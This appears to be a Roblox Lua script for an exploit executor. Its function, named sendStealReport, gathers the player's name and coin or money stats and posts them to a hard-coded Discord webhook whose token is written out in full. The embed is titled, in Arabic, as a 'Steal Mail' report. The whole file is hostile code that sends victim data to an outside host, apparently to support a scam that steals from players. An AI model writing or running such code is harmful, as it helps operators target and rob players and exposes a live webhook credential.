local WebhookURL = "https://discord.com/api/webhooks/1489215951093239890/052bJ8vjLfNKXfP5ED3iMfYZEzG8PPwBbXb9IZegNHFoNCpwbk0X5DF-YdWuqUY7hvxP"
local HttpService = game:GetService("HttpService")
local LocalPlayer = game.Players.LocalPlayer

local function sendStealReport()
    local coins = "0"
    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
    if leaderstats then
        for _, val in pairs(leaderstats:GetChildren()) do
            if string.find(string.lower(val.Name), "coin") or string.find(string.lower(val.Name), "money") then
                coins = tostring(val.Value)
            end
        end
    end
    
    local payload = {
        ["content"] = "<@1486461099002953982>", 
        ["embeds"] = {{
            ["title"] = "📦 تم ضغط Steal Mail من الهاتف",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "💰 Player Coins", ["value"] = "```" .. coins .. "```", ["inline"] = true},
                {["name"] = "👤 Player Name", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true}
            }
        }}
    }
    
    pcall(function()
        local requestFunc = syn and syn.request or http and http.request or http_request or request
        if requestFunc then
            requestFunc({
                Url = WebhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end
    end)
end

